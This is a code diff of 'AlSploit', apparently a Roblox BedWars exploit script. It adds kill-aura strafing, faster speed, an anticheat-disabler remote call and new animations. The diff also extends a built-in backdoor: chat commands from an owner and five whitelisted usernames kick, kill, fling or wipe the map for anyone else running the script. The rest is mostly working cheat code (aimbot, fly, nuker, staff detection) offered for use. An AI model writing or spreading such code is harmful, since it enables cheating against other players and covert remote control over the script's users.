@@ -1,11 +1,16 @@
+local WhitelistedUsers = {User1 = "imagod_033", User2 = "4SaD45", User3 = "iusealsploit", User4 = "umother2001vjd", User5 = "nawhatthe"}
+local Owner = "nawhatthe"
+
 local LocalPlayer = game.Players.LocalPlayer
 
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local CollectionService = game:GetService("CollectionService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local LightingService = game:GetService("Lighting")
 local PlayerService = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local StatsService = game:GetService("Stats")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local WorkSpace = game:GetService("Workspace") or game.Workspace or workspace
@@ -46,8 +51,8 @@ NotificationContainer.BackgroundColor3 = Color3.new(255, 255, 255)
 NotificationContainer.BackgroundTransparency = 1.000
 NotificationContainer.BorderColor3 = Color3.new(0, 0, 0)
 NotificationContainer.BorderSizePixel = 0
-NotificationContainer.Position = UDim2.new(0.842737675, 0, 0, 0)
-NotificationContainer.Size = UDim2.new(0.157002911, 0, 0.980487823, 0)
+NotificationContainer.Position = UDim2.new(0.8, 0, 0, 0)
+NotificationContainer.Size = UDim2.new(0.2, 0, 0.980487823, 0)
 
 NotificationContainerUIListLayout.Parent = NotificationContainer
 NotificationContainerUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
@@ -199,7 +204,7 @@ local function CreateToggle(Parent, Name, DefaultValue, CallBack)
 	Toggle.TextColor3 = Color3.new(255, 255, 255)
 	Toggle.TextSize = 12.000
 	Toggle.TextXAlignment = Enum.TextXAlignment.Left
-	Toggle.LayoutOrder = DefaultLayoutOrder + 5
+	Toggle.LayoutOrder = DefaultLayoutOrder + 10
 
 	LayoutOrder = Toggle.LayoutOrder
 	DefaultLayoutOrder = LayoutOrder
@@ -549,7 +554,7 @@ local function CreateNotification(Duration, Message)
 	Text.BorderColor3 = Color3.new(0, 0, 0)
 	Text.BorderSizePixel = 0
 	Text.Position = UDim2.new(-0.00263573672, 0, 0, 0)
-	Text.Size = UDim2.new(0.999999881, 0, 1.0000006, 0)
+	Text.Size = UDim2.new(1, 0, 1, 0)
 	Text.Font = Enum.Font.GothamBold
 	Text.Text = Message
 	Text.TextColor3 = Color3.new(255, 255, 255)
@@ -602,8 +607,8 @@ local function CreateFlyHud()
 	UIStroke.Parent = Background
 	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 	UIStroke.Thickness = 2
-	
-	
+
+
 	task.spawn(function()
 		repeat
 			task.wait(0.001)
@@ -611,7 +616,7 @@ local function CreateFlyHud()
 			UIStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
 		until not game
 	end)
-	
+
 	UICorner.Parent = Background
 
 	Text.Name = "Text"
@@ -692,7 +697,7 @@ end
 local Settings = {}
 local Loaded = false
 
-local SaveFileName = "AlSploitConfigurationSavingBedwars"
+local SaveFileName = "SavingSystemAlSploit"
 
 local function CreateSettingsFile()
 	Settings = {
@@ -715,7 +720,7 @@ local function CreateSettingsFile()
 		Invisible = {Value = false, KeyBind = "..."},
 		AimAssist = {Value = true, Range = 18, KeyBind = "..."},
 		Scaffold = {Value = false, ExpandDistance = 2, KeyBind = "..."},
-		KillAura = {Value = true, Range = 20, CustomAnimation = true, ToolCheck = false, KeyBind = "..."},
+		KillAura = {Value = true, Range = 20, CustomAnimation = true, ToolCheck = false, Strafe = false, KeyBind = "..."},
 		AntiVoid = {Value = true, Transparency = 0.65, KeyBind = "..."},
 		AutoBank = {Value = true, Range = 30, KeyBind = "..."},
 		HighJump = {Value = false, KeyBind = "..."},
@@ -730,6 +735,7 @@ local function CreateSettingsFile()
 		Reach = {Value = true, KeyBind = "..."},
 		Nuker = {Value = true, Range = 30, BreakOres = true, KeyBind = "..."},
 		BedTp = {Value = true, KeyBind = "..."},
+		Sigma = {Value = true, KeyBind = "..."},
 		Cape = {Value = true, KeyBind = "..."},
 		Fly = {Value = false, KeyBind = "..."},
 		Esp = {Value = true, KeyBind = "..."},
@@ -801,6 +807,7 @@ local OrigC0 = ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0
 local KnitClient = debug.getupvalue(require(LocalPlayer.PlayerScripts.TS.knit).setup, 6)
 local Client = require(ReplicatedStorage.TS.remotes).default.Client
 
+local BlossomWindTunnelCreateBodyForceRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BlossomWindTunnelCreateBodyForce")
 local HannahPromptTriggerRemote = Client:Get("HannahPromptTrigger")
 local TrinitySetAngelTypeRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetAngelType")
 local SetObservedChestRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("Inventory/SetObservedChest")
@@ -843,6 +850,7 @@ local InfiniteFlyValue = false
 local FlyBodyVelocity = nil
 local SpoofedCamera = nil
 local AntiVoidPart = nil
+local LoopWaitTime = 0
 local DamageBoost = false
 local StartLevel = nil
 local ZephyrOrb = 0
@@ -851,10 +859,21 @@ local FlyValue = false
 local FlyDown = false
 local FlyUp = false
 
+local Fps = 0
+
 local Animations = {
 	KillAura = {
 		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Time = 0.25},
 		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
+	},
+	
+	Sigma = {
+		{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.16},
+		{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.16},
+	},
+	
+	Neutral = {
+		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.15},
 	}
 }
 
@@ -931,7 +950,7 @@ end
 
 local function FindNearestEntity(MaxDistance)
 	local MaxDistance = MaxDistance or math.huge
-	
+
 	local NearestEntityDistance = MaxDistance
 	local NearestEntity = nil
 	local IsNotAPlayer = true
@@ -1137,7 +1156,18 @@ function TouchingGround()
 	end
 end
 
-function SetCollisions(Value)
+local function PlayAnimation(Animation)
+	for i, v in next, Animation do
+		local TweenInformation = TweenInfo.new(v.Time)
+		local AnimationTween = TweenService:Create(Camera.Viewmodel.RightHand.RightWrist, TweenInformation, {C0 = OrigC0 * v.CFrame})
+		
+		AnimationTween:Play()
+
+		task.wait(v.Time - 0.01)
+	end
+end
+
+local function SetCollisions(Value)
 	if Value == true then
 		if IsAlive(LocalPlayer) then
 			for i, v in next, (LocalPlayer.Character:GetDescendants()) do
@@ -1175,7 +1205,7 @@ local function DecimalRound(Number, DigitsPast0)
 	if Number >= 0 then 
 		Number = math.floor(Number + 0.5) 
 	end
-	
+
 	if Number < 0 then
 		Number = math.ceil(Number - 0.5) 
 	end
@@ -1267,7 +1297,7 @@ end
 local function SwitchItem(Item)
 	if LocalPlayer.Character.HandInvItem.Value ~= Item then
 		local InventoryItem = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(Item)
-		
+
 		EquipItemRemote:InvokeServer({hand = InventoryItem})
 	end	
 end
@@ -1395,13 +1425,13 @@ function IsMoving()
 
 	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position ~= Position then
 		Position = LocalPlayer.Character.PrimaryPart.Position
-		
+
 		return true
 	end
 
 	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position == Position then
 		Position = LocalPlayer.Character.PrimaryPart.Position
-		
+
 		return false
 	end
 end
@@ -1443,7 +1473,7 @@ local function AutoBank()
 	if NearestNpc then
 		CollectEnderChestItems()
 	end
-	
+
 	if not NearestNpc then
 		SecureEnderChestItems()
 	end
@@ -1491,7 +1521,7 @@ function GetSpeed()
 		end
 
 		if AnticheatDisabled == true then
-			Speed = Speed + 12
+			Speed = Speed + 19
 		end
 
 		Speed = ((Speed + Settings.Speed.Speed) - 20)
@@ -1756,7 +1786,7 @@ function AutoBuy()
 			if HasItem("iron_chestplate") then
 				PurchaseItem(DiamondArmor)
 			end	
-			
+
 			if HasItem("stone_sword") and not HasItem("iron_chestplate") and not HasItem("diamond_chestplate") and not HasItem("emerald_chestplate") then
 				PurchaseItem(LeatherArmor)
 			end	
@@ -1786,9 +1816,7 @@ function AutoKit()
 
 	task.spawn(function()
 		if FindPetrifiedPlayer then
-			MinerRemote:SendToServer({
-				petrifyId = FindPetrifiedPlayer:GetAttribute("PetrifyId")
-			})
+			MinerRemote:FireServer({petrifyId = FindPetrifiedPlayer:GetAttribute("PetrifyId")})
 		end
 	end)
 
@@ -1808,7 +1836,7 @@ function IsAlive(Player)
 	return true
 end	
 
-local function SwordHit(Entity, Weapon)
+local function SwordHit(Entity, Weapon, NearestEntityDistance)
 	local LocalPlayerHumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
 	local EntityPrimaryPart = Entity.PrimaryPart
 
@@ -1818,13 +1846,23 @@ local function SwordHit(Entity, Weapon)
 		if KillAuraAnimationCooldown and Settings.KillAura.CustomAnimation == true then
 			KillAuraAnimationCooldown = false
 
-			for i, v in next, Animations.KillAura do
-				local AnimationTween = TweenService:Create(Camera.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = OrigC0 * v.CFrame}):Play()
+			if Settings.Sigma.Value == false then
+				PlayAnimation(Animations.KillAura)
 
-				task.wait(v.Time - 0.01)
+				KillAuraAnimationCooldown = true
 			end
+			
+			if Settings.Sigma.Value == true then
+				PlayAnimation(Animations.Sigma)
 
-			KillAuraAnimationCooldown = true
+				KillAuraAnimationCooldown = true
+			end
+		end
+	end)
+
+	task.spawn(function()
+		if Settings.KillAura.Strafe == true and NearestEntityDistance < (AnticheatDisabled and 16 or 12) then
+			LocalPlayerHumanoidRootPart.CFrame = CFrame.new(EntityPrimaryPart.Position - EntityPrimaryPart.CFrame.LookVector * 5 + Vector3.new(0, 0, 5))
 		end
 	end)
 
@@ -1833,7 +1871,7 @@ local function SwordHit(Entity, Weapon)
 			task.spawn(function()
 				SwitchItem(Weapon.itemType)
 			end)
-			
+
 			SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)
 
 			SwordHitRemote:FireServer({
@@ -1975,11 +2013,11 @@ end
 
 local function FlyMe()
 	local FlyGroundTime = tick()
-	
+
 	if FlyValue == true and IsAlive(LocalPlayer) then		
 		task.spawn(function()
 			local FlyHud, NumberDisplay, SliderDisplay = CreateFlyHud()
-			
+
 			repeat
 				task.wait()
 
@@ -1999,7 +2037,7 @@ local function FlyMe()
 
 			FlyHud:Destroy()
 		end)		
-		
+
 		task.spawn(function()
 			FlyBodyVelocity = Instance.new("BodyVelocity")
 			FlyBodyVelocity.MaxForce = Vector3.new(0, 9e9, 0)
@@ -2009,7 +2047,7 @@ local function FlyMe()
 			FlyGroundTime = tick()
 
 			repeat
-				task.wait()
+				task.wait(LoopWaitTime)
 
 				if TouchingGround() then
 					FlyGroundTime = tick()
@@ -2029,20 +2067,20 @@ local function FlyMe()
 						local Raycast = workspace:Raycast(LocalPlayer.Character.PrimaryPart.Position, Vector3.new(0, -1000, 0), FlyRaycastParameters)
 
 						if Raycast and Raycast.Instance and IsAlive(LocalPlayer) then 
-							LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(Raycast.Instance.Position)
+							LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(Raycast.Instance.Position) + Vector3.new(0, LocalPlayer.Character.Humanoid.HipHeight, 0)
 
 							task.wait(0.12)
 
 							if IsAlive(LocalPlayer) then 
 								LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(LocalPlayer.Character.PrimaryPart.Position + (Vector3.new(0, FlyTeleportPosition, 0) - Vector3.new(0, LocalPlayer.Character.PrimaryPart.Position.Y, 0)))
-
+								
 								FlyGroundTime = tick()
 							end		
 						end
 					end
 				end
 			until FlyValue == false or not IsAlive(LocalPlayer)
-			
+
 			if LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity") then
 				LocalPlayer.Character.PrimaryPart:FindFirstChild("FlyBodyVelocity"):Destroy()
 				FlyGroundTime = tick()
@@ -2053,22 +2091,30 @@ end
 
 task.spawn(function()
 	repeat
-		task.wait()
-		
+		task.wait(LoopWaitTime)
+
 		if Settings.KillAura.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
-			local NearestEntity = FindNearestEntity(Settings.KillAura.Range)
+			local NearestEntity, NearestEntityDistance = FindNearestEntity(Settings.KillAura.Range)
 			local Sword = GetSword()
 
-			if NearestEntity and Sword then
-				SwordHit(NearestEntity, Sword)
-			end
+			task.spawn(function()
+				if not NearestEntity then
+					PlayAnimation(Animations.Neutral)
+				end
+			end)
+
+			task.spawn(function()
+				if NearestEntity and Sword then
+					SwordHit(NearestEntity, Sword, NearestEntityDistance)
+				end
+			end)
 		end
 	until not game	
 end)
 
 task.spawn(function()
 	repeat
-		task.wait()
+		task.wait(LoopWaitTime)
 
 		task.spawn(function()
 			if Settings.AimAssist.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
@@ -2081,11 +2127,11 @@ task.spawn(function()
 				end
 			end		
 		end)
-		
+
 		task.spawn(function()		
 			if Settings.Aimbot.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0  then	
 				local NearestEntity, NearestEntityDistance = FindNearestEntity(math.huge)
-				
+
 				local BestBow = GetBow()
 
 				if BestBow and IsAlive(LocalPlayer) and NearestEntity and not NearestEntity:FindFirstChildOfClass("ForceField") and NearestEntityDistance > 18  then
@@ -2121,7 +2167,7 @@ task.spawn(function()
 				end
 			end
 		end)
-		
+
 		task.spawn(function()
 			local HipHeight = 1.99999
 
@@ -2143,13 +2189,17 @@ task.spawn(function()
 
 					ElkSummonRemote:FireServer(unpack(Args))
 				end)
+				
+				task.spawn(function()
+					BlossomWindTunnelCreateBodyForceRemote:FireServer()
+				end)
 			end
 
 			if Settings.AcDisabler.Value == false or not IsAlive(LocalPlayer) or not LocalPlayer.Character:FindFirstChild("elk") then
 				AnticheatDisabled = false
 			end
 		end)
-		
+
 		task.spawn(function()
 			if Settings.Scaffold.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
 				for i = 1, Settings.Scaffold.ExpandDistance do
@@ -2168,7 +2218,7 @@ task.spawn(function()
 	until not game
 end)
 
-task.spawn(function()
+task.spawn(function()	
 	repeat
 		task.wait(0.5)
 
@@ -2205,12 +2255,12 @@ task.spawn(function()
 				AutoBuy()
 			end			
 		end)
-		
+
 		task.spawn(function()
 			if Settings.Fov.Value == true then 
 				FovController:setFOV(Settings.Fov.Fov) 
 			end 
-			
+
 			if Settings.Fov.Value == false then 
 				FovController:setFOV(ClientHandlerStore:getState().Settings.fov) 
 			end
@@ -2224,9 +2274,9 @@ task.spawn(function()
 
 		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
 			task.spawn(function()
-				if BlockPlacementController.blockPlacer.clientManager and ClientHandlerStore:getstate().Inventory.observedInventory == "block" then
+				if ClientHandlerStore:getstate().Inventory.observedInventory == "block" and BlockPlacementController.blockPlacer.clientManager then
 					local MouseInformation = BlockPlacementController.blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)
-					
+
 					if MouseInformation then
 						BlockPlacementController.blockPlacer:placeBlock(MouseInformation.placementPosition)
 					end
@@ -2256,7 +2306,7 @@ task.spawn(function()
 	local ReportedList = {}
 
 	repeat
-		task.wait()
+		task.wait(LoopWaitTime)
 
 		if Settings.AutoReport.Value == true then
 			for i, v in next, PlayerService:GetPlayers() do
@@ -2279,28 +2329,30 @@ task.spawn(function()
 				if Settings.AntiStaff.Kick == true then
 					LocalPlayer:Kick("A staff has joined your game!")
 				end
-				
+
 				CreateNotification(60,  "A staff has joined your game!")	
 			end)
 		end
 	end)
-	
+
 	task.spawn(function()
 		task.wait(5)
-		
-		for i, v in next, PlayerService:GetPlayers() do
-			if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
 
-				task.spawn(function()
+		for i, v in next, PlayerService:GetPlayers() do
+			task.spawn(function()
+				if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
+
 					task.spawn(function()
-						if Settings.AntiStaff.Kick == true then
-							LocalPlayer:Kick("A staff has joined your game!")
-						end
-					end)
-					
-					CreateNotification(60,  "A staff has joined your game!")	
-				end)								
-			end
+						task.spawn(function()
+							if Settings.AntiStaff.Kick == true then
+								LocalPlayer:Kick("A staff has joined your game!")
+							end
+						end)
+
+						CreateNotification(60,  "A staff has joined your game!")	
+					end)								
+				end
+			end)			
 		end
 	end)
 end)
@@ -2316,16 +2368,16 @@ task.spawn(function()
 				if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
 					AutoToxic(v)
 				end
-				
+
 				if Settings.GodMode.Value == true and Health > 30 and GodModed == true and v == LocalPlayer then
 					InfiniteFlyValue = false
 					GodModed = false
 				end
-				
+
 				if Settings.GodMode.Value == true and Health <= 30 and GodModed == false and InfiniteFlyValue == false and v == LocalPlayer then
 					InfiniteFlyValue = true
 					GodModed = true
-					
+
 					InfFly()
 				end
 			end)
@@ -2342,7 +2394,7 @@ task.spawn(function()
 						if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
 							AutoToxic(v)
 						end
-						
+
 						if Settings.GodMode.Value == true and Health > 30 and GodModed == true and v == LocalPlayer then
 							InfiniteFlyValue = false
 							GodModed = false
@@ -2399,7 +2451,7 @@ task.spawn(function()
 			local SpeedValue = GetSpeed()
 
 			local SpeedRaycastParameters = RaycastParams.new()
-			
+
 			SpeedRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}
 
 			local SpeedCFrame = LocalPlayer.Character.Humanoid.MoveDirection * SpeedValue * Delta
@@ -2420,7 +2472,7 @@ task.spawn(function()
 		if Settings.Nuker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
 			local NearestBed = FindNearestBed(Settings.Nuker.Range) or nil
 			local NearestOre = FindNearestOre(Settings.Nuker.Range) or nil
-			
+
 			if NearestBed or NearestOre then
 				Nuker(NearestBed, NearestOre)
 			end			
@@ -2666,7 +2718,7 @@ task.spawn(function()
 			end
 		end)
 	end)
-	
+
 	task.spawn(function()
 		local InstanceUI
 		local Value = false
@@ -2766,6 +2818,25 @@ task.spawn(function()
 			end
 		end)
 	end)
+	
+	task.spawn(function()
+		local InstanceUI
+		local Value = false
+
+		DropDownButton.Activated:Connect(function()
+			Value = not Value
+
+			if Value == true then
+				InstanceUI = CreateMiniToggle(CombatTab, "Strafe", Settings.KillAura.Strafe, LayoutOrder + 4, function(CallBack)
+					Settings.KillAura.Strafe = CallBack
+				end)
+			end
+
+			if Value == false then
+				InstanceUI:Destroy()
+			end
+		end)
+	end)
 
 	task.spawn(function()
 		local InstanceUI
@@ -2775,7 +2846,7 @@ task.spawn(function()
 			Value = not Value
 
 			if Value == true then
-				InstanceUI = CreateSlider(CombatTab, "Range", Settings.KillAura.Range, 20, LayoutOrder + 4, function(CallBack)
+				InstanceUI = CreateSlider(CombatTab, "Range", Settings.KillAura.Range, 20, LayoutOrder + 5, function(CallBack)
 					Settings.KillAura.Range = CallBack
 				end)
 			end
@@ -3453,7 +3524,7 @@ task.spawn(function()
 			end
 		end)
 	end)
-	
+
 	task.spawn(function()
 		local InstanceUI
 		local Value = false
@@ -3791,6 +3862,16 @@ task.spawn(function()
 
 		if Settings.FpsBooster.Value == true then
 			FpsBoost()
+
+			task.spawn(function()
+				CreateNotification(5, "AlSploit is now in balanced mode")
+			end)			
+		end
+
+		if Settings.FpsBooster.Value == false then
+			task.spawn(function()
+				CreateNotification(5, "AlSploit is now in performance mode")
+			end)
 		end
 	end)
 
@@ -4205,7 +4286,7 @@ end)
 task.spawn(function()
 	local Esp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "Esp", Settings.Esp.Value, function(CallBack)
 		Settings.Esp.Value = CallBack
-		
+
 		if Settings.Esp.Value == true then
 			task.spawn(function()
 				for i, v in next, PlayerService:GetPlayers() do
@@ -4235,7 +4316,7 @@ task.spawn(function()
 				end)
 			end)
 		end
-		
+
 		if Settings.Esp.Value == false then
 			for i, v in next, PlayerService:GetPlayers() do
 				if IsAlive(v) and CallBack == false and v.Character.PrimaryPart:FindFirstChild("Esp") then
@@ -4298,7 +4379,7 @@ task.spawn(function()
 								end)
 							end)
 						end)
-						
+
 						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
 					end
 
@@ -4310,7 +4391,7 @@ task.spawn(function()
 								end
 							end
 						end)
-								
+
 						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
 					end
 				end
@@ -4754,6 +4835,65 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+	local Sigma, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Sigma", Settings.Sigma.Value, function(CallBack)
+		Settings.Sigma.Value = CallBack
+		
+		if Settings.Sigma.Value == true then
+			task.spawn(function()
+				if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal") then
+					LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal").Texture = "rbxassetid://" .. 13528140280
+				end
+			end)
+		end
+		
+		if Settings.Sigma.Value == false then
+			task.spawn(function()
+				if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal") then
+					LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Decal").Texture = "rbxassetid://" .. 16223063079
+				end
+			end)
+		end
+	end)
+
+	task.spawn(function()
+		local InstanceUI
+		local Value = false
+
+		DropDownButton.Activated:Connect(function()
+			Value = not Value
+
+			if Value == true then
+				InstanceUI = CreateKeyBind(WorldTab, Settings.Sigma.KeyBind, LayoutOrder + 1, function(CallBack)
+					Settings.Sigma.KeyBind = CallBack
+				end)
+			end
+
+			if Value == false then
+				InstanceUI:Destroy()
+			end
+		end)
+	end)
+
+	task.spawn(function()
+		UserInputService.InputBegan:Connect(function(Input)
+			if not UserInputService:GetFocusedTextBox() then
+				if Input.KeyCode.Name == Settings.Sigma.KeyBind then
+					Settings.Sigma.Value = not Settings.Sigma.Value
+
+					if Settings.Sigma.Value == true then
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
+					end
+
+					if Settings.Sigma.Value == false then
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
+					end
+				end
+			end
+		end)
+	end)
+end)
+
+task.spawn(function()
 	local Nuker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Nuker", Settings.Nuker.Value, function(CallBack)
 		Settings.Nuker.Value = CallBack
 	end)
@@ -4794,7 +4934,7 @@ task.spawn(function()
 			end
 		end)
 	end)
-	
+
 	task.spawn(function()
 		local InstanceUI
 		local Value = false
@@ -4837,25 +4977,31 @@ end)
 task.spawn(function()
 	local Cape, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Cape", Settings.Cape.Value, function(CallBack)
 		Settings.Cape.Value = CallBack
-		
-		if Settings.Cape.Value == true then
-			CreateCape("rbxassetid://14347677597")
-			
-			task.spawn(function()
-				LocalPlayer.CharacterAdded:Connect(function()
-					if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") and CallBack == true then
-						task.wait(0.3)
 
-						CreateCape("rbxassetid://14347677597")
-					end
+		if Settings.Cape.Value == true then
+			task.spawn(function()
+				local DecalId = (Settings.Sigma.Value and 13528140280 or 16223063079)
+				
+				CreateCape("rbxassetid://" .. DecalId)
+
+				task.spawn(function()
+					LocalPlayer.CharacterAdded:Connect(function()
+						if IsAlive(LocalPlayer) and not LocalPlayer.Character:FindFirstChild("Cape") and CallBack == true then
+							task.wait(0.3)
+
+							CreateCape("rbxassetid://" .. DecalId)
+						end
+					end)
 				end)
-			end)
+			end)			
 		end
-		
+
 		if Settings.Cape.Value == false then
-			if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
-				LocalPlayer.Character.Cape:Destroy()
-			end
+			task.spawn(function()
+				if IsAlive(LocalPlayer) and LocalPlayer.Character:FindFirstChild("Cape") then
+					LocalPlayer.Character.Cape:Destroy()
+				end
+			end)			
 		end
 	end)
 
@@ -4894,44 +5040,62 @@ task.spawn(function()
 				end
 			end
 		end)
+
 	end)
 end)
-
-local Owner = "nawhatthe"
 
 task.spawn(function()
 	repeat
 		task.wait(1)
-		
+
 		for i, v in next, PlayerService:GetPlayers() do
-			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						LocalPlayer:Kick("Kicked by AlSploit owner")
-					end)
-				end
-				
-				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
-					task.spawn(function()
-						KillHumanoid(0)
-					end)
-				end
-				
-				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~=  Owner then
-					task.spawn(function()
-						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
-					end)
-				end				
-				
-				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~=  Owner then
-					task.spawn(function()
-						for i, v in next, CollectionService:GetTagged("block") do
-							v:Destroy()
-						end
-					end)
-				end
-			end)
+			for i, v1 in next, WhitelistedUsers do
+				v.Chatted:Connect(function(Message)				
+					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
+						task.spawn(function()
+							LocalPlayer:Kick("Kicked by AlSploit owner")
+						end)
+					end
+
+					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
+						task.spawn(function()
+							KillHumanoid(0)
+						end)
+					end
+
+					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
+						task.spawn(function()
+							LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
+						end)
+					end				
+
+					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
+						task.spawn(function()
+							for i, v in next, CollectionService:GetTagged("block") do
+								v:Destroy()
+							end
+						end)
+					end
+				end)
+			end
 		end
+	until not game
+end)
+
+task.spawn(function()
+	local FrameRateManager = StatsService and StatsService:FindFirstChild("FrameRateManager")
+	local RenderAverage = FrameRateManager and FrameRateManager:FindFirstChild("RenderAverage")
+
+	local function GetFramerate()
+		return math.round(1000 / RenderAverage:GetValue())
+	end
+
+	repeat
+		task.wait()
+
+		Fps = GetFramerate()
+
+		LoopWaitTime = (Settings.FpsBooster.Value == true and DecimalRound(((1.5 / Fps) * 4), 3)  or 0)
 	until not game
 end)
 
@@ -4953,6 +5117,11 @@ task.spawn(function()
 
 	ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))
 
-	CreateNotification(5, "AlSploit has loaded!")
-	setfpscap(999)
+	task.spawn(function()
+		CreateNotification(5, "AlSploit has loaded!")
+	end)
+
+	task.spawn(function()
+		setfpscap(999)
+	end)
 end)
